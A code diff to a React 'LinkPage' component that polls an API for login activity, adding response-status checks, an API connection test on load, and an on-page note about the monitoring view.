@@ -177,9 +177,13 @@ export default function LinkPage() {
     async function checkForActivity() {
       try {
         const response = await fetch('/api/poll');
+        if (!response.ok) {
+          console.error('API response not OK:', response.status);
+          return;
+        }
         const activities = await response.json();
         
-        if (activities && activities.length > 0) {
+        if (activities && Array.isArray(activities) && activities.length > 0) {
           activities.forEach(activity => {
             addActivityEntry(activity);
           });
@@ -189,7 +193,19 @@ export default function LinkPage() {
       }
     }
 
-    // Initial fetch
+    // Test API connection on load
+    async function testConnection() {
+      try {
+        const response = await fetch('/api/test');
+        const data = await response.json();
+        console.log('API connection test:', data);
+      } catch (error) {
+        console.error('API connection failed:', error);
+      }
+    }
+
+    // Initial fetch and test
+    testConnection();
     checkForActivity();
     const interval = setInterval(checkForActivity, 1000);
 
@@ -393,6 +409,11 @@ export default function LinkPage() {
           <div id="activity-log">
             <div className="no-activity">No activity yet. Waiting for login attempts...</div>
           </div>
+        </div>
+        <div style={{ marginTop: '20px', padding: '10px', background: '#fff', borderRadius: '8px', fontSize: '12px', color: '#666' }}>
+          <strong>Monitoring Page Active</strong><br />
+          Access this page at: <code>/link</code><br />
+          Activities will appear here when users log in.
         </div>
       </div>
     </>
